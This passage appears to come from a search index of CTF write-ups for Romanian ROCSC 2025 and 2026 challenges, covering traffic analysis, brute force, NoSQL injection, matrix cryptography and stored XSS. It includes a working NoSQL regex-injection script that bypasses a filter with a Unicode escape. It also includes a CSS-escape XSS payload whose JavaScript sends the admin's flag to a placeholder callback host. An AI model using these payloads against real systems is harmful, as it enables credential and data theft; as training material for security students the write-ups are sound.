further.</p>"},{"location":"rocsc2025/exfill-very%20funny/description/#http-stream-analysis","title":"HTTP Stream Analysis","text":"<p>Examining the HTTP headers reveals some interesting patterns:</p> <pre><code>GET /pag0.html HTTP/1.1\nHost: 192.168.124.91\nUser-Agent: curl/00 0 0 0 0\nAccept-Encoding: gzip, deflate, br\nAccept: */*\nConnection: keep-alive\nHTTP/1.1 200 OK\nDate: Tue, 18 Feb 2025 08:27:00 GMT\nServer: Apache/2.4.58 (Ubuntu)\nLast-Modified: Sat, 15 Feb 2025 06:28:01 GMT\nETag: \"1025-62e28649ab2bf-gzip\"\nAccept-Ranges: bytes\nVary: Accept-Encoding\nContent-Encoding: gzip\nContent-Length: 1857\nKeep-Alive: timeout=5, max=100\nConnection: Keep-Alive\nContent-Type: text/html\n</code></pre> <p>The content of the HTTP responses contains Chuck Norris jokes, which serves as a potential hint.</p> <p></p>"},{"location":"rocsc2025/exfill-very%20funny/description/#identifying-the-anomaly","title":"Identifying the Anomaly","text":"<p>Upon closer inspection of the headers across multiple streams, we notice something suspicious in the <code>User-Agent</code> field. The value after <code>curl/</code> contains sequences of zeros that differ across streams, unlike the ETag values which repeat every 10 streams.</p> <p>This pattern suggests that the <code>User-Agent</code> field might be used for data exfiltration.</p>"},{"location":"rocsc2025/exfill-very%20funny/description/#extracting-the-data","title":"Extracting the Data","text":"<p>To efficiently extract this data, we create a Python script to automatically pull the sequences of zeros from the <code>User-Agent</code> headers across all HTTP streams.</p>"},{"location":"rocsc2025/exfill-very%20funny/description/#script","title":"Script","text":"<pre><code>import pyshark\n\ncapture = pyshark.FileCapture('captura.pcap', display_filter='http')\nresult = \"\"\n\nfor packet in capture:\n    if hasattr(packet, 'http') and hasattr(packet.http, 'user_agent'):\n        user_agent = packet.http.user_agent\n        if 'curl/' in user_agent:\n            curl_data = user_agent.split('curl/')[1]\n            result += curl_data\n\nprint(result)\n</code></pre> <p>Running the script produces the following output:</p> <p></p> <p>The result is a long sequence of zeros with no other characters, suggesting some form of encoding.</p>"},{"location":"rocsc2025/exfill-very%20funny/description/#decoding-the-message","title":"Decoding the Message","text":"<p>The presence of Chuck Norris jokes in the HTTP content provides a crucial clue. After researching Chuck Norris-related encodings, we discover the \"Chuck Norris Unary Code\" which exclusively uses zeros:</p> <p></p> <p>Using an online tool to decode our extracted sequence, we get:</p> <p></p> <p>The decoded output is a sequence of 'C' and 'N' characters (representing \"Chuck\" and \"Norris\"), confirming our decoding approach was correct.</p>"},{"location":"rocsc2025/exfill-very%20funny/description/#final-decryption","title":"Final Decryption","text":"<p>To convert this 'C' and 'N' sequence into meaningful information, we try several approaches: - Converting C/N to binary (0/1 and vice versa) - Base64 decoding - Caesar cipher - Decoding as 7 or 8-bit chunks</p> <p>After multiple unsuccessful attempts, we try the decabit code (used in telegraphy) and successfully decode the message:</p> <p></p> <p>The decoded message reveals our flag, which after reversing becomes: <code>ctf{b3d7630e73726a79f39210a8c5e170aa1da595404aacbf0c765501c8c3257e5b}</code></p>"},{"location":"rocsc2025/exfill-very%20funny/description/#conclusion","title":"Conclusion","text":"<p>This challenge demonstrated the importance of: 1. Analyzing HTTP headers for anomalies 2. Recognizing patterns across multiple requests 3. Using contextual clues (Chuck Norris jokes) to identify encoding schemes 4. Persistence in trying different decoding methods</p> <p>The exfiltration technique of hiding data in the User-Agent field was particularly clever, as this header is often overlooked in traffic analysis.</p>"},{"location":"rocsc2025/formula1/description/","title":"Formula 1 Web Challenge Write-up","text":""},{"location":"rocsc2025/formula1/description/#challenge-overview","title":"Challenge Overview","text":"<p>This web challenge features a Formula 1-themed login form where we need to exploit a race condition vulnerability to retrieve the hidden flag.</p>"},{"location":"rocsc2025/formula1/description/#initial-reconnaissance","title":"Initial Reconnaissance","text":"<p>Upon accessing the website, we're presented with a Formula 1-styled login form:</p> <p></p> <p>Testing the login form with random credentials redirects us to <code>login_process.php</code>, which returns an error message indicating that the username is incorrect.</p> <p>Taking a closer look at the image, we notice Max Verstappen (F1 champion) is featured prominently. This gives us our first clue:</p> <ol> <li>When attempting to log in with username <code>max</code>, the error message changes to \"password is not correct\"</li> <li>This confirms our first discovery: the valid username is <code>max</code></li> </ol>"},{"location":"rocsc2025/formula1/description/#discovering-the-vulnerability","title":"Discovering the Vulnerability","text":"<p>While standard analysis of HTML and CSS revealed no useful information, examining the network traffic exposes a critical insight:</p> <ul> <li>After submitting incorrect credentials, the application briefly routes to <code>/flag.php</code> before immediately redirecting to <code>index.php</code></li> <li>This suggests a potential race condition vulnerability (cleverly hinted at by the Formula 1 \"race\" theme)</li> </ul> <p>Our objective becomes clear: we need to exploit this race condition to access the <code>/flag.php</code> route before the redirect occurs.</p>"},{"location":"rocsc2025/formula1/description/#exploitation-strategy","title":"Exploitation Strategy","text":"<p>To exploit this vulnerability, we'll use Burp Suite to brute force the password while monitoring the network traffic:</p> <ol> <li>Capturing the Request</li> <li>Intercept the login request using Burp Suite's Proxy</li> </ol> <p></p> <ol> <li>Setting Up the Intruder</li> <li>Forward the captured request to Intruder for automated testing</li> </ol> <p></p> <ol> <li>Configuring Attack Parameters</li> <li>Select the password field as our injection point by highlighting it and clicking \"Add\"</li> <li>This tells Burp Suite to target only the password value during the brute force attempt</li> </ol> <p></p> <ol> <li>Selecting a Wordlist</li> <li>Navigate to the Payloads tab</li> <li>Load the \"10k-most-common.txt\" wordlist to systematically test common passwords</li> </ol> <p></p> <ol> <li>Launching the Attack</li> <li>Ensure \"Sniper Attack\" mode is selected (tests one parameter with a single wordlist)</li> <li>Click \"Start Attack\" to begin the brute force operation</li> <li>The attack monitoring window appears:</li> </ol> <p></p>"},{"location":"rocsc2025/formula1/description/#exploiting-the-race-condition","title":"Exploiting the Race Condition","text":"<p>While Burp Suite is running the attack: 1. Forward the intercepted request in Burp Suite 2. Quickly return to the main page 3. Back in Burp Suite, we notice a request to <code>/flag.php</code> - forward this request 4. Return to the web page and refresh</p> <p>The race condition is successfully exploited! By intercepting the traffic during the brute force attempt, we manage to catch the application during its brief visit to the flag page before redirection occurs. The flag is now displayed on screen:</p> <p></p>"},{"location":"rocsc2025/formula1/description/#conclusion","title":"Conclusion","text":"<p>This challenge elegantly combines multiple security concepts: - Username enumeration (discovering <code>max</code> as valid) - Brute force password attacks (using Burp Suite Intruder) - Race condition vulnerability exploitation (catching the <code>/flag.php</code> before redirect)</p> <p>All of these concepts are wrapped in a thematic Formula 1 presentation, where both the visual elements and the vulnerability itself (race condition) align with the racing theme.</p>"},{"location":"rocsc2025/fruit-salad/description/","title":"Fruit-Salad CTF Write-Up","text":""},{"location":"rocsc2025/fruit-salad/description/#challenge-overview","title":"Challenge Overview","text":"<p>In this CTF we are provided with a web page and the next hint: \"This new web application to order fruit salads is really nice, I hope I can add mango into mine.\"</p> <p>We go on the page and see some simple check button page to select fruits and a button with the text order.</p>"},{"location":"rocsc2025/fruit-salad/description/#initial-reconnaissance","title":"Initial Reconnaissance","text":"<p>We will start by analyzing the frontend code of the page by opening the console: </p> <p>From the picture we see that we have some JavaScript client-side code that takes the selected fruits and sends a POST request to the '/order' endpoint, sending the selected fruits in the body.</p>"},{"location":"rocsc2025/fruit-salad/description/#testing-the-api","title":"Testing the API","text":"<p>We will open Postman and try different inputs to see how that endpoint reacts.</p> <p>First we will try sending a fruit to the backend: </p> <p>The server responds that we should eat more fruits.</p> <p>Let's try sending more fruits... </p> <p>When we send 5 fruits we get a different message: \"Enjoy your salad\".</p> <p>Basically when we send 5 fruits rather than fewer, we get different messages. This is a key point in solving the problem.</p>"},{"location":"rocsc2025/fruit-salad/description/#understanding-the-hint","title":"Understanding the Hint","text":"<p>Let's go back to the hint: \"I hope I can add mango into mine\". \"Mango\" is an allusion to \"Mongo\", so we will try NoSQL injection.</p> <p>We know that the flag starts with \"CTF{\" and ends with \"}\", so in order to get the flag we will try to find every letter one by one.</p>"},{"location":"rocsc2025/fruit-salad/description/#the-exploit-approach","title":"The Exploit Approach","text":"<p>The idea is that we will send 4 fruits and one NoSQL injection prompt containing the \"CTF{\" + one letter at a time.</p> <p>For example, let's say the first 5 characters in the flag are: \"CTF{a\" If we send a JSON like: <pre><code>{\n    \"fruits\": [\n        \"Grape\",\n        \"Grape\",\n        \"Grape\",\n        {\"$regex\": \"^CTF{a\"},\n        \"Grape\"\n    ]\n}\n</code></pre></p> <p>This will return the message \"Enjoy your salad\" because it will find a match for \"CTF{a\" in the database.</p> <p>Otherwise if we send: <pre><code>{\n    \"fruits\": [\n        \"Grape\",\n        \"Grape\",\n        \"Grape\",\n        {\"$regex\": \"^CTF{b\"},\n        \"Grape\"\n    ]\n}\n</code></pre></p> <p>It will return that we should eat more fruits because it won't find the 4th \"fruit\" and only count 4 fruits instead of 5.</p>"},{"location":"rocsc2025/fruit-salad/description/#bypassing-security-measures","title":"Bypassing Security Measures","text":"<p>Now, we have to construct the exact exploit for the NoSQL injection, so we will try to send different payloads with Postman.</p> <p></p> <p>Here we see the message: \"Nice try, hacker\", so we have to find other payloads in order to bypass the system.</p> <p>We will try to escape the \"$\" character, as this is the character that causes us problems. To do this, instead of \"$\" we will try its Unicode value \"\\u0024\".</p> <p>The payload will look like this: </p> <p>As we see, now the message changes, which means that the \"$\" character escapes detection, so now we can try to find the flag letter by letter or digit by digit in order to get the full flag. If a letter or digit is correct then the message \"Enjoy your salad\" will be displayed, otherwise the message displayed will be that we should eat more fruits.</p>"},{"location":"rocsc2025/fruit-salad/description/#automating-the-exploit","title":"Automating the Exploit","text":"<p>To get the flag I constructed a Python script that tries every letter and number. When the message is \"Enjoy your salad\", it means that the letter or number is correct, so we memorize it into the variable where we construct the flag and go to the next character.</p> <p>Running this script (see the exploit.py file in this folder) gives us the complete flag character by character. </p>"},{"location":"rocsc2025/fruit-salad/description/#exploit","title":"Exploit","text":"<pre><code>import string\nimport requests\n\nurl = \"&lt;site-url&gt;/order\"\n\nunicode_char = string.ascii_letters + string.digits + \"}\"\nflag = \"CTF{\"\n\nwhile True:\n    ok = False\n    for char in unicode_char:\n        req = '''\n            {\n    \"fruits\": [\n        \"Grape\",\n        \"Grape\",\n        \"Grape\",\n        {\"\\\\u0024regex\": \"^''' + flag + char + '''\"},\n        \"Grape\"\n    ]\n}\n        '''\n        http_res = requests.post(url=url,data=req,headers={\"Content-Type\": \"application/json\"})\n        response = http_res.json().get(\"message\",\"\")\n        print(f\"{flag + char}, {response}\")\n        if(response == \"Enjoy your salad!\"):\n            flag+=char\n            ok = True\n            print(f'Partial flag : {flag}')\n            if(char == \"}\"):\n                print(f'Flag found: {flag}')\n                exit(0)\n            break\n</code></pre>"},{"location":"rocsc2025/fruit-salad/description/#key-takeaways","title":"Key Takeaways","text":"<ol> <li>The hint (\"mango\") pointed to MongoDB/NoSQL injection</li> <li>Understanding the response behavior was crucial (5 fruits vs fewer)</li> <li>Bypassing security filters by using Unicode escape sequences</li> <li>Using regex pattern matching to extract the flag character by character</li> </ol> <p>This challenge demonstrates a common NoSQL injection vulnerability and how improper input validation can lead to data extraction.</p>"},{"location":"rocsc2025/mathrix/","title":"Mathrix CTF Challenge Write-up","text":""},{"location":"rocsc2025/mathrix/#challenge-overview","title":"Challenge Overview","text":"<p>In this challenge, we were presented with a cryptographic problem involving matrix encryption. The challenge provided two files:</p> <ol> <li><code>mathrix.sage</code> - The encryption/decryption script</li> <li><code>out.txt</code> - The output containing the encrypted flag and cryptographic parameters</li> </ol> <p>The challenge description included a hint: \"pff, who needs a finite body for sure? anyways,\" suggesting we need to think about the mathematical structure being used.</p>"},{"location":"rocsc2025/mathrix/#understanding-the-encryption","title":"Understanding the Encryption","text":"<p>Looking at the provided code in <code>mathrix.sage</code>, we can understand the encryption scheme:</p> <pre><code>from secret import get_generator\n\np = random_prime(2^64)\nA = get_generator(p)\n\nflag = \"CTF{...}\"\nassert flag.startswith(\"CTF{\") and flag.endswith(\"}\") and len(flag[4:-1]) == 64 and all(c in \"0123456789abcdef\" for c in flag[4:-1])\n\ndef encrypt(p, A, Ax, m):\n    Zp = Zmod(p)\n    M, A, Ax = matrix(Zp, 8, 8), matrix(Zp, A), matrix(Zp, Ax)\n    assert len(m) &lt;= 64\n    for i in range(len(m)):\n        row, col = divmod(i, 8)\n        M[row, col] = ord(m[i])\n    assert M.is_invertible()\n    k = randrange(1, p)\n\n    return A ** k, M * (Ax ** k)\n\ndef decrypt(p, x, Ak, C):\n    Zp = Zmod(p)\n    Ak, C = matrix(Zp, Ak), matrix(Zp, C)\n    Akx = (Ak ** x).inverse()\n    M = C * Akx\n    dec = []\n    for i in range(8):\n        for j in range(8):\n            if M[i,j] == 0:\n                return \"\".join(dec)\n            dec.append(chr(M[i,j]))\n    return \"\".join(dec)\n\nx = randrange(1, p)\nAx = A ** x\n\nAk, C = encrypt(p, A, Ax, flag[4:-1])\n\nprint(\"p =\", p)\nprint(\"A =\", list(A))\nprint(\"Ax =\", list(Ax))\nprint(\"Ak =\", list(Ak))\nprint(\"C =\", list(C))\n</code></pre> <p>The key components: - <code>p</code>: A random prime number - <code>A</code>: A generator matrix - <code>x</code>: A random exponent (the private key) - <code>Ax</code>: The matrix <code>A^x</code> (can be viewed as the public key) - <code>k</code>: Another random exponent used for encryption - <code>Ak</code>: The matrix <code>A^k</code> - <code>C</code>: The encrypted message</p>"},{"location":"rocsc2025/mathrix/#understanding-the-problem","title":"Understanding the Problem","text":"<p>From the output file, we have all variables except <code>x</code>. To decrypt, we need to: 1. Find <code>x</code> 2. Compute <code>Akx = (Ak^x)^(-1)</code> 3. Calculate <code>M = C * Akx</code> to obtain the original message</p> <p>The core challenge is finding <code>x</code>, which means solving a discrete logarithm problem: given <code>A</code> and <code>Ax = A^x</code>, find <code>x</code>.</p>"},{"location":"rocsc2025/mathrix/#the-solution-approach","title":"The Solution Approach","text":"<p>The key insight is that calculating discrete logarithms for matrices is computationally intensive, but we can simplify the problem. The hint in the challenge description (\"pff, who needs a finite body for sure? anyways,\") suggests we should consider transforming our problem into a more manageable form.</p> <p>We can solve this by:</p> <ol> <li>Finding the Jordan normal form of matrix <code>A</code></li> <li>Transforming both <code>A</code> and <code>Ax</code> into this form</li> <li>Reducing the matrix discrete logarithm to scalar discrete logarithms, which are much easier to compute</li> </ol>"},{"location":"rocsc2025/mathrix/#mathematical-background","title":"Mathematical Background","text":"<p>The Jordan normal form of a matrix <code>A</code> can be represented as:</p> <pre><code>J = P^(-1) * A * P\n</code></pre> <p>Where <code>P</code> is an invertible matrix and <code>J</code> is the Jordan normal form of <code>A</code>.</p> <p>Once we have the transformation, we can apply:</p> <pre><code>J^x = P^(-1) * A^x * P\n</code></pre> <p>This means that finding <code>x</code> such that <code>A^x = Ax</code> is equivalent to finding <code>x</code> such that <code>J^x = P^(-1) * Ax * P</code>.</p> <p>The beauty of the Jordan form is that it's essentially a block diagonal matrix, where each block is upper triangular. This makes the discrete logarithm calculation much simpler.</p>"},{"location":"rocsc2025/mathrix/#complete-exploit","title":"Complete Exploit","text":"<p>The complete exploit can be found in this folder</p>"},{"location":"rocsc2025/mathrix/#executing-the-solution","title":"Executing the Solution","text":"<p>When running the exploit in SageMath, we get:</p> <p></p>"},{"location":"rocsc2025/mathrix/#exploit","title":"Exploit","text":"<pre><code>#!/usr/bin/env sage\n\np = 14763417175056989171\nA = [(3934133768252467709, 9711753323648742955, 4057538947712413177, 13090260569717578039, 6755530057269299188, 7247218952354544933, 6673878785928818615, 5065087006597340577), (809193092982461252, 12627176165219210989, 767153889566215023, 571460234615269944, 7280109969278516385, 2328702493977949648, 3108784222337939082, 5479777785602975377), (6894448672603483472, 6329267389824899421, 10143262751405557085, 1011170290996749727, 6954231363616586963, 9556901686692614873, 4129049877040244242, 5256515365147071753), (10311150777272097711, 701746981202461220, 11406874654076909758, 4380149002014194591, 8326726204218282617, 5790564227006166245, 12765437031185555431, 8471721479961671611), (11028328055627204580, 13693831665620890676, 1132432238396919105, 2200668664456957216, 10701020514377076580, 10824794119624280142, 12006821520845827453, 7485245284691968546), (13336491058094365230, 14064309882741698831, 3583646573035682688, 2912258912559209914, 11284337034528105054, 12184622525921611098, 4496313336860363043, 12094710648808048697), (9581579314712211619, 1559598537809961197, 3710429153849466791, 8439794050522809089, 10688929641589782289, 8578597674644294575, 1722668868934485909, 10945421307067911394), (6842273819723309068, 10578443475309374153, 9017847806880076889, 11276187354952492913, 4753894044618839595, 11505884469640760980, 10341648728709052794, 1761990770216615514)]\nAx = [(8403850723876965368, 9347688063520705231, 6275409485013171394, 7208693975411409991, 8762069594964957378, 12556558003051901809, 3478151079044972016, 7936282466560936842), (4399944517991372103, 13856703654949637789, 11058631603550304681, 9761307062773886683, 8233925433546689993, 14761116795497464265, 12835702862507428256, 5515060863281861167), (5811321211712515340, 2394242112660991036, 10807798548550402009, 11838940400326993206, 8875548367906665497, 12537232941815186978, 10348505067914580196, 11378164379836799930), (4232923706661751670, 7068050926581334614, 2890063220219904117, 577916661389548134, 602779492250436689, 14742288056032658911, 11090168908293047169, 186449777641404413), (8509607375518280585, 8334583566088830363, 14075064152748125061, 1599689866064110407, 5955979288649432584, 832531400148892125, 5787645333611973131, 815106912408254348), (12550281233711157917, 9644930460389428229, 11897082964763909184, 10404459096704002537, 62292355624296343, 3985105362704273526, 11204790301060563681, 3255580564457538364), (8117573041883315954, 11156569826384272574, 11783447673656633408, 173499848719984744, 11227156009176501151, 12850686001824080831, 5271432311286502414, 1654384489586741478), (527996262262338742, 2086398111674672988, 1902677869991158182, 13195196296264050553, 3084688218448240396, 7032214947665371753, 2064203025689849267, 11975946965091842835)]\nAk = [(757411405122966805, 4459944179884813399, 4746884050313062017, 5631250737874769749, 5706538448557061015, 12790679015538441534, 3327535834836524250, 8185186463392634381), (2935395638025053750, 10204384498967279677, 3296298413002795600, 3878204986063417504, 3095966951594067821, 8517886908524780552, 13107375194539385201, 6301047765840300848), (7283390972216424947, 14708833553873614203, 6661928603250498839, 3671980783903690558, 3755507776999610805, 4921173688686579904, 2968457920939095863, 1193761319827363928), (229051880100688383, 12687550219226095340, 234943672324989749, 4492662919324809170, 3819324128674931412, 11996160500707970888, 8776838841107497933, 4814320658071465745), (4602029534223624461, 9002048856576559617, 2648749412424660003, 7757975037413580475, 14200222868741557288, 11185455410504240030, 13442512054298222324, 8927713659394137956), (13907218385442839376, 2892410063022129106, 12962920643977425008, 13115694573727979736, 8645924345598223602, 6352637057326880846, 10137357963090924719, 7118402809461629057), (12043255173097273579, 7798047187472859802, 7740988015853672620, 9485505007046723803, 7899240887340099774, 13868533966999412119, 12397868800045490029, 4126886778675264754), (8900015364825783974, 5241641150896677766, 8563142568607826016, 10467629774620909560, 6436457749227915574, 12282439462523763344, 8925836872723381379, 4974474109834934395)]\nC = [(6915558338014438117, 12451042222793413637, 7638294894367871876, 3104727376757289732, 4626696272775266346, 8250831952881949950, 13746445595364469659, 9391546435106499160), (6722185607026327711, 4466120759690075698, 3483824822402337093, 12180250585561114314, 5923440829659578211, 2513020793841904126, 486318610882807182, 14239620350162455491), (14082023822876615979, 4894578199880285547, 323010225001234150, 10151455083560104160, 558355034479192293, 10398597781386616928, 7858544723784632781, 13198804764201097545), (5052485151018805426, 9177976164909236668, 5375899746992341329, 9035476507930830925, 2348323093251990008, 6365124841513458676, 2703296767829104770, 9204188515838180404), (5702644489369618712, 8928473672659780804, 770312696546965847, 146796199117678429, 11182893829711202793, 7874967079210277384, 1660725768397156217, 1859756437726015908), (11276191028720386727, 885170123560992531, 1335689604375245369, 7423062193287221480, 723665244040114963, 11148447575256943320, 9666107341635200840, 359563205102193652), (13443617071893066944, 5484930276789084632, 8205174542262162209, 14029654962924420615, 8214881934121755827, 13105322972299443047, 4385809884812415941, 1982700230407689942), (293460829524001390, 4284176843651967608, 11541637336975526176, 7283362431241172122, 11252771460374487303, 7717969075392907137, 3052713200960745246, 7891800168131919742)]\n\nA = Matrix(GF(p), A)\nAx = Matrix(GF(p), Ax)\nAk = Matrix(GF(p), Ak)\ndef discrete_logarithm(M,A):\n    k = M.charpoly().splitting_field('x')\n    J, P = M.jordan_form(k, transformation=True)\n    Q = ~P * A * P\n    return discrete_log(Mod(Q[0][0], p), Mod(J[0][0], p))\n\nx = discrete_logarithm(A,Ax)\nprint(x)\n\ndef decrypt(p, x, Ak, C):\n    Zp = Zmod(p)\n    Ak, C = matrix(Zp, Ak), matrix(Zp, C)\n    Akx = (Ak ** x).inverse()\n    M = C * Akx\n    dec = []\n    for i in range(8):\n        for j in range(8):\n            if M[i,j] == 0:\n                return \"\".join(dec)\n            dec.append(chr(M[i,j]))\n    return \"\".join(dec)\n\nflag = decrypt(p,x,Ak,C)\nprint('CTF{' + flag + '}')\n</code></pre>"},{"location":"rocsc2025/mathrix/#key-insights","title":"Key Insights","text":"<ol> <li>The challenge illustrates the concept of matrix discrete logarithms</li> <li>Jordan normal form provides a powerful tool to simplify matrix problems</li> <li>The transformation reduced a complex matrix problem to simpler scalar computations</li> <li>Understanding the mathematical structure of the problem is essential to finding an efficient solution</li> </ol>"},{"location":"rocsc2025/mathrix/#conclusion","title":"Conclusion","text":"<p>This challenge demonstrated an interesting application of linear algebra and number theory in cryptography. By transforming the problem into Jordan normal form, we were able to efficiently solve what would otherwise be a computationally intensive discrete logarithm problem.</p> <p>The key takeaway is that mathematical transformations can often simplify seemingly complex cryptographic challenges, making them tractable with the right approach.</p>"},{"location":"rocsc2025/mathrix/#credits","title":"Credits","text":"<p>Credits: infernosalex</p> <p>Blog: https://scant.ro</p>"},{"location":"rocsc2026/","title":"ROCSC 2026 - Romanian Cybersecurity Challenge","text":"<p>This directory contains writeups for ROCSC 2026 challenges organized by category.</p>"},{"location":"rocsc2026/#cryptography","title":"Cryptography","text":"Challenge Description fifteen-minutes Lattice attack"},{"location":"rocsc2026/#web","title":"Web","text":"Challenge Description Y CSS escape + XSS open-tellmewhy CVE research and XSS"},{"location":"rocsc2026/#osint","title":"OSINT","text":"Challenge Description museum Google reverse search wonderful-strangers. Sherlock search art-gallery-heist. Footprinting and social media OSINT"},{"location":"rocsc2026/#pwn","title":"Pwn","text":"Challenge Description directory Buffer overflow and partial ret address overwrite ropy. Buffer overflow and 2 stage ropchain attack oshi. OOB read + FSOP"},{"location":"rocsc2026/#mobile","title":"Mobile","text":"Challenge Description avault Decompiled android java code reverse engineering in-search-of-a-lost-note. Android reverse engineering and cryptographic procedures reccon"},{"location":"rocsc2026/#network","title":"Network","text":"Challenge Description chimera-void Network traffic analysis"},{"location":"rocsc2026/#mlai","title":"ML/AI","text":"Challenge Description session-gpt Lateral movement by JWT leakage"},{"location":"rocsc2026/#misc","title":"Misc","text":"Challenge Description jail Python jail escape by submodules clanker-casino. Captcha bypass"},{"location":"rocsc2026/#steganography","title":"Steganography","text":"Challenge Description echoes-of-the-past Metadata and RMS energy analysis <p>Total Challenges: 16 Categories: Cryptography, Web, OSINT, Pwn, Misc, Mobile, Steganography, ML/AI, Network</p> <p>Back to Main Repository</p>"},{"location":"rocsc2026/Y/writeup/","title":"y \u2014 Web Writeup","text":"<p>Author: Luma Category: Web URL: <code>http://TARGET:PORT</code></p>"},{"location":"rocsc2026/Y/writeup/#overview","title":"Overview","text":"<p>A Flask social-media platform where each user can customise their profile with CSS. An admin bot (Selenium/Chrome headless) visits any URL we submit via a \"Report Suspicious Link\" form. The admin's username is the flag, visible on the <code>/settings</code> page. The goal is to achieve stored XSS on the admin's profile and use it to exfiltrate the flag.</p>"},{"location":"rocsc2026/Y/writeup/#reconnaissance","title":"Reconnaissance","text":""},{"location":"rocsc2026/Y/writeup/#application-structure","title":"Application structure","text":"Route Purpose <code>/register</code>, <code>/login</code> Account management <code>/feed</code> View all posts; submit a link for admin review <code>/profile/&lt;id&gt;</code> View a user's profile \u2014 renders user's custom CSS <code>/settings</code> View own username (flag for admin) and edit CSS <code>/settings/css</code> <code>POST</code> \u2014 update profile CSS <code>/report</code> <code>POST</code> \u2014 admin bot logs in and visits the submitted URL"},{"location":"rocsc2026/Y/writeup/#key-observations","title":"Key observations","text":"<ol> <li> <p>Admin's username is the flag. In <code>app.py</code>, the admin account is created with <code>username = ADMIN_FLAG</code> (the flag), and the <code>/settings</code> template displays it: <code>{{ user.username }}</code>.</p> </li> <li> <p>Admin bot logs in with the flag as username. The <code>/report</code> handler calls <code>run_report(link, ADMIN_FLAG, 'admin123')</code>, which makes the bot log in using the flag as the username and then visit the reported URL.</p> </li> <li> <p>Profile CSS is rendered unsanitised into a <code>&lt;style&gt;</code> tag. In the <code>/profile/&lt;id&gt;</code> route:    <pre><code>css = \"&lt;style&gt;\" + user['profile_css'] + \"&lt;/style&gt;\" if user['profile_css'] else \"\"\nreturn render_template('profile.html', ..., profile_css=css)\n</code></pre>    And in <code>profile.html</code>:    <pre><code>{{ profile_css | safe }}\n</code></pre>    The <code>| safe</code> filter tells Jinja2 to skip HTML-escaping, trusting the server-side sanitisation.</p> </li> <li> <p>CSS sanitisation only filters <code>CSSStyleRule</code> \u2014 <code>@import</code> rules pass through unchecked.</p> </li> <li> <p>BeautifulSoup + <code>html.parser</code> doesn't understand CSS escape sequences.</p> </li> </ol>"},{"location":"rocsc2026/Y/writeup/#vulnerability-analysis","title":"Vulnerability Analysis","text":""},{"location":"rocsc2026/Y/writeup/#bug-1-sanitize_css-ignores-import-rules","title":"Bug 1: <code>sanitize_css()</code> ignores <code>@import</code> rules","text":"<p>In <code>css.py</code>, the sanitiser uses <code>cssutils</code> and only inspects <code>CSSStyleRule</code> objects:</p> <pre><code>for rule in list(sheet):\n    if isinstance(rule, cssutils.css.CSSStyleRule):\n        # only style rules are checked\n        for prop in list(rule.style):\n            if prop.name not in ALLOWED_PROPERTIES:\n                rule.style.removeProperty(prop.name)\n</code></pre> <p>An <code>@import</code> rule produces a <code>CSSImportRule</code>, which is not <code>CSSStyleRule</code>, so the loop body never executes for it. Any <code>@import</code> rule survives sanitisation verbatim.</p>"},{"location":"rocsc2026/Y/writeup/#bug-2-cssutils-decodes-css-hex-escapes-during-serialization","title":"Bug 2: cssutils decodes CSS hex escapes during serialization","text":"<p>CSS allows hex escape sequences like <code>\\3c</code> (which decodes to <code>&lt;</code>) and <code>\\3e</code> (which decodes to <code>&gt;</code>). When <code>cssutils</code> serializes the parsed CSS back to a string, it decodes these escapes into their literal characters.</p> <p>So the input: <pre><code>@import url(\"\\3c /style\\3e \\3c script\\3e alert(1)\\3c /script\\3e \\3c style\\3e \");\n</code></pre></p> <p>Gets serialized by <code>cssutils</code> as: <pre><code>@import url(\"&lt;/style&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;style&gt;\");\n</code></pre></p>"},{"location":"rocsc2026/Y/writeup/#bug-3-beautifulsoup-htmlparser-doesnt-parse-css-escapes","title":"Bug 3: BeautifulSoup <code>html.parser</code> doesn't parse CSS escapes","text":"<p>Before <code>sanitize_css()</code> runs, the app wraps the input in <code>&lt;style&gt;</code> tags and checks it with BeautifulSoup:</p> <pre><code>in_style = \"&lt;style&gt;\" + request.form.get('profile_css', '') + \"&lt;/style&gt;\"\nsoup = BeautifulSoup(in_style, 'html.parser')\nif len(soup.contents) != 1 or soup.contents[0].name != 'style':\n    flash('Invalid CSS input')\n    return redirect(url_for('settings'))\n</code></pre> <p>This check ensures the raw input doesn't contain HTML tags that would break out of <code>&lt;style&gt;</code>. However, CSS hex escapes like <code>\\3c</code> are not recognised as HTML by <code>html.parser</code> \u2014 it sees them as harmless text inside the style block. The check passes.</p>"},{"location":"rocsc2026/Y/writeup/#full-chain-css-hex-escapes-stored-xss","title":"Full chain: CSS hex escapes \u2192 Stored XSS","text":"<ol> <li>Attacker submits CSS with <code>@import url(\"\\3c /style\\3e \\3c script\\3e JS_PAYLOAD\\3c /script\\3e \\3c style\\3e \");</code></li> <li>BeautifulSoup check passes \u2014 <code>\\3c</code> is not <code>&lt;</code> from the HTML parser's perspective.</li> <li><code>sanitize_css()</code> preserves the <code>@import</code> \u2014 it's not a <code>CSSStyleRule</code>.</li> <li><code>cssutils</code> decodes the escapes \u2014 the stored CSS now contains literal <code>&lt;/style&gt;&lt;script&gt;...&lt;/script&gt;&lt;style&gt;</code>.</li> <li>When the profile is rendered, this breaks out of the <code>&lt;style&gt;</code> tag and injects a <code>&lt;script&gt;</code> \u2014 stored XSS.</li> </ol>"},{"location":"rocsc2026/Y/writeup/#exploitation","title":"Exploitation","text":""},{"location":"rocsc2026/Y/writeup/#strategy","title":"Strategy","text":"<ol> <li>Register a new user.</li> <li>Set the user's profile CSS to the XSS payload via <code>POST /settings/css</code>.</li> <li>The injected JavaScript will: fetch <code>/settings</code> (same-origin), extract the admin username (flag) from the response, and exfiltrate it to an attacker-controlled server.</li> <li>Report the attacker's profile URL (<code>/profile/&lt;uid&gt;</code>) to the admin bot.</li> <li>The admin bot visits the profile, the XSS fires in the admin's browser, and the flag is sent to our callback.</li> </ol>"},{"location":"rocsc2026/Y/writeup/#javascript-payload","title":"JavaScript payload","text":"<p>The XSS fetches the <code>/settings</code> page (which displays the logged-in user's username) and sends it to an external callback URL:</p> <pre><code>fetch('/settings').then(r=&gt;r.text()).then(t=&gt;{\n  var x=t.split('Username:')[1].split('&lt;/p&gt;')[0];\n  new Image().src='https://CALLBACK/?f='+encodeURIComponent(x)\n})\n</code></pre>"},{"location":"rocsc2026/Y/writeup/#css-payload","title":"CSS payload","text":"<p>The JS is embedded within CSS hex escapes inside an <code>@import</code> rule:</p> <pre><code>@import url(\"\\3c /style\\3e \\3c script\\3e fetch('/settings').then(r=&gt;r.text()).then(t=&gt;{var x=t.split('Username:')[1].split('&lt;/p&gt;')[0];new Image().src='https://CALLBACK/?f='+encodeURIComponent(x)})\\3c /script\\3e \\3c style\\3e \");\n</code></pre> <p>After <code>cssutils</code> serialization, this becomes:</p> 